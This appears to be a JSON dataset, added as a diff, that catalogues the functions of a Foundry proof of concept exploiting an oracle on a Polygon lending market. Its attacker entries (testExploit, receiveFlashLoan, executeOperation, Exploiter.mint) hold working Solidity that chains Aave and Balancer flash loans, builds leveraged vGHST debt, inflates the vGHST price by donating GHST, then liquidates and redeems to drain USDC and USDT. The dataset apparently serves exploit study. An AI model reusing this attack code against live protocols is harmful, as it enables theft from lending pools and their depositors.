@@ -1,0 +1,254 @@
+[
+  {
+    "contract/interface": "ISwapFlashLoan",
+    "source_type": "victim_contract",
+    "function_name": "swap",
+    "original_code": "    function swap(\n        SingleSwap memory singleSwap,\n        FundManagement memory funds,\n        uint256 limit,\n        uint256 deadline\n    )\n        external\n        payable\n        override\n        nonReentrant\n        whenNotPaused\n        authenticateFor(funds.sender)\n        returns (uint256 amountCalculated)\n    {\n        // The deadline is timestamp-based: it should not be relied upon for sub-minute accuracy.\n        // solhint-disable-next-line not-rely-on-time\n        _require(block.timestamp <= deadline, Errors.SWAP_DEADLINE);\n\n        // This revert reason is for consistency with `batchSwap`: an equivalent `swap` performed using that function\n        // would result in this error.\n        _require(singleSwap.amount > 0, Errors.UNKNOWN_AMOUNT_IN_FIRST_SWAP);\n\n        IERC20 tokenIn = _translateToIERC20(singleSwap.assetIn);\n        IERC20 tokenOut = _translateToIERC20(singleSwap.assetOut);\n        _require(tokenIn != tokenOut, Errors.CANNOT_SWAP_SAME_TOKEN);\n\n        // Initializing each struct field one-by-one uses less gas than setting all at once.\n        IPoolSwapStructs.SwapRequest memory poolRequest;\n        poolRequest.poolId = singleSwap.poolId;\n        poolRequest.kind = singleSwap.kind;\n        poolRequest.tokenIn = tokenIn;\n        poolRequest.tokenOut = tokenOut;\n        poolRequest.amount = singleSwap.amount;\n        poolRequest.userData = singleSwap.userData;\n        poolRequest.from = funds.sender;\n        poolRequest.to = funds.recipient;\n        // The lastChangeBlock field is left uninitialized.\n\n        uint256 amountIn;\n        uint256 amountOut;\n\n        (amountCalculated, amountIn, amountOut) = _swapWithPool(poolRequest);\n        _require(singleSwap.kind == SwapKind.GIVEN_IN ? amountOut >= limit : amountIn <= limit, Errors.SWAP_LIMIT);\n\n        _receiveAsset(singleSwap.assetIn, amountIn, funds.sender, funds.fromInternalBalance);\n        _sendAsset(singleSwap.assetOut, amountOut, funds.recipient, funds.toInternalBalance);\n\n        // If the asset in is ETH, then `amountIn` ETH was wrapped into WETH.\n        _handleRemainingEth(_isETH(singleSwap.assetIn) ? amountIn : 0);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "algebraSwapCallback",
+    "original_code": "    function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            IERC20(IAlgebraPool(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));\n        } else if (amount1Delta > 0) {\n            IERC20(IAlgebraPool(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "executeOperation",
+    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        if (msg.sender == address(aaveV3)) {\n            GHST.approve(msg.sender, type(uint256).max);\n            USDC.approve(msg.sender, type(uint256).max);\n            USDT.approve(msg.sender, type(uint256).max);\n            aaveV2Flashloan();\n            return true;\n        } else {\n            USDC.approve(msg.sender, type(uint256).max);\n            USDT.approve(msg.sender, type(uint256).max);\n            balancerFlashloan();\n            console.log(\"6. swap asset to USD and GHST\");\n            swapTokenToUSDAndGHST();\n            return true;\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "receiveFlashLoan",
+    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        console.log(\"1. deposit USDT collateral\");\n        vGHST.enter(294_000 * 1e18);\n        oUSDT.mint(USDT.balanceOf(address(this))); // deposit USDT collateral\n\n        console.log(\"2. borrow asset\");\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(oUSDT);\n        unitroller.enterMarkets(cTokens);\n        borrowAll(); // borrow asset\n\n        console.log(\"3. Build leveraged debt positions by USDC collateral\");\n        USDC.transfer(address(exploiter), 24_500_000 * 1e6);\n        vGHST.transfer(address(exploiter), vGHST.balanceOf(address(this)));\n        exploiter.mint(24, address(this)); // Build leveraged debt positions by USDC collateral\n\n        console.log(\"4. VGHSTOracle price manipulation\");\n        console.log(\"the price of vGHST before donate:\\t\", vGHST.convertVGHST(1e18));\n        GHST.transfer(address(vGHST), 1_656_000 * 1e18); // VGHSTOracle price manipulation\n        console.log(\"the price of vGHST after donate:\\t\", vGHST.convertVGHST(1e18));\n\n        console.log(\"5. liquidate Leveraged Debt and Get back USDC collateral\");\n        liquidateLeveragedDebt(); // liquidate Leveraged Debt\n        oUSDC.redeem(oUSDC.balanceOf(address(this))); // Get back USDC collateral\n        oUSDC.redeemUnderlying(USDC.balanceOf(address(oUSDC))); // ?\n        vGHST.leave(vGHST.balanceOf(address(this)));\n\n        USDC.transfer(address(Balancer), amounts[0]);\n        USDT.transfer(address(Balancer), amounts[1]);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"polygon\", 42_054_768);\n        vm.label(address(GHST), \"GHST\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(USDT), \"USDT\");\n        vm.label(address(WMATIC), \"WMATIC\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(WBTC), \"WBTC\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(miMATIC), \"miMATIC\");\n        vm.label(address(WMATIC), \"WMATIC\");\n        vm.label(address(stMATIC), \"stMATIC\");\n        vm.label(address(gDAI), \"gDAI\");\n        vm.label(address(wstETH), \"wstETH\");\n        vm.label(address(MATICX), \"MATICX\");\n        vm.label(address(vGHST), \"vGHST\");\n        vm.label(address(oMATIC), \"oMATIC\");\n        vm.label(address(oWBTC), \"oWBTC\");\n        vm.label(address(oDAI), \"oDAI\");\n        vm.label(address(oWETH), \"oWETH\");\n        vm.label(address(oUSDC), \"oUSDC\");\n        vm.label(address(oMATICX), \"oMATICX\");\n        vm.label(address(owstWETH), \"owstWETH\");\n        vm.label(address(ovGHST), \"ovGHST\");\n        vm.label(address(aaveV3), \"aaveV3\");\n        vm.label(address(aaveV2), \"aaveV2\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(AlgebraPool1), \"AlgebraPool1\");\n        vm.label(address(AlgebraPool2), \"AlgebraPool2\");\n        vm.label(address(AlgebraPool3), \"AlgebraPool3\");\n        vm.label(address(SLP), \"SLP\");\n        vm.label(address(UniV2Pair), \"UniV2Pair\");\n        vm.label(address(AavegotchiPoolPair), \"AavegotchiPoolPair\");\n        vm.label(address(UniV3Pair1), \"UniV3Pair1\");\n        vm.label(address(UniV3Pair2), \"UniV3Pair2\");\n        vm.label(address(UniV3Pair3), \"UniV3Pair3\");\n        vm.label(address(UniV3Pair4), \"UniV3Pair4\");\n        vm.label(address(DMMLP), \"DMMLP\");\n        vm.label(address(swapFlashLoan), \"swapFlashLoan\");\n        vm.label(address(unitroller), \"unitroller\");\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() external {\n        deal(address(this), 0);\n        exploiter = new Exploiter();\n        vGHST.approve(address(ovGHST), type(uint256).max);\n        GHST.approve(address(vGHST), type(uint256).max);\n        USDT.approve(address(oUSDT), type(uint256).max);\n        aaveV3Flashloan();\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n        );\n        emit log_named_decimal_uint(\n            \"Attacker GHST balance after exploit\", GHST.balanceOf(address(this)), GHST.decimals()\n        );\n    }\n    // aaveV3, aaveV2 FlashLoan callback\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV3SwapCallback",
+    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            IERC20(Uni_Pair_V3(msg.sender).token0()).transfer(msg.sender, uint256(amount0Delta));\n        } else if (amount1Delta > 0) {\n            IERC20(Uni_Pair_V3(msg.sender).token1()).transfer(msg.sender, uint256(amount1Delta));\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IAlgebraPool",
+    "source_type": "victim_contract",
+    "function_name": "token0",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IAlgebraPool",
+    "source_type": "victim_contract",
+    "function_name": "token1",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "convertVGHST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "enter",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "leave",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "IVGHST",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "Exploiter",
+    "source_type": "attacker_contract",
+    "function_name": "mint",
+    "original_code": "    function mint(uint256 amountOfOptions, address owner) external {\n        oUSDC.mint(USDC.balanceOf(address(this)));\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(oUSDC);\n        unitroller.enterMarkets(cTokens);\n        ovGHST.borrow(vGHST.balanceOf(address(ovGHST)));\n        uint256 vGHSTAmount = vGHST.balanceOf(address(this));\n        console.log(\"vGHST\", vGHST.balanceOf(address(this)));\n        for (uint256 i; i < amountOfOptions; i++) {\n            ovGHST.mint(vGHSTAmount);\n            ovGHST.borrow(vGHSTAmount);\n        }\n        vGHST.transfer(owner, vGHSTAmount);\n        ovGHST.transfer(owner, ovGHST.balanceOf(address(this)));\n        oUSDT.borrow(USDT.balanceOf(address(oUSDT)));\n        oUSDC.borrow(720_000 * 1e6);\n        USDT.transfer(owner, USDT.balanceOf(address(this)));\n        USDC.transfer(owner, USDC.balanceOf(address(this)));\n    }\n",
+    "description": ""
+  }
+]
